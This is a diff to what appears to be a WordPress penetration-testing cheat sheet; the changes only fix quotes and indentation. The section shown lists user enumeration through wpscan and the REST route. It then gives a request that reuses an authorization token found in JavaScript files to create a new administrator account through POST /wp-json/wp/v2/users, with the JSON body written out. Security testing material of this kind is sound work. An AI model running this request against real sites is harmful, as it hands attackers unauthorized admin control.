@@ -83,20 +83,21 @@ wpscan --url https://target.com -e u
     - `https://target.com/?rest_route=/wp/v2/users`
 ### Add user to the server
 - Search for `Authorization` in javascript files and request to `POST /wp-json/wp/v2/users` to add user.
+
   ```bash
   POST /wp-json/wp/v2/users
   Authorization: Bearer <authorization_token_you_found_in_js_files>`
   ```
--	body of the request:
+- body of the request:
   ```bash
-  	{
-	“username”:"yourUsername",
-	“email”:"yourEmail",
-   “password”:"yourPassword",
-	“roles”:["administrator"]
+	{
+	"username":"yourUsername",
+	"email":"yourEmail",
+	"password":"yourPassword",
+	"roles":["administrator"]
 	}
   ```
--	Navigate to /wp-login.php/ and login.
+- Navigate to /wp-login.php/ and login.
 
 ---
 
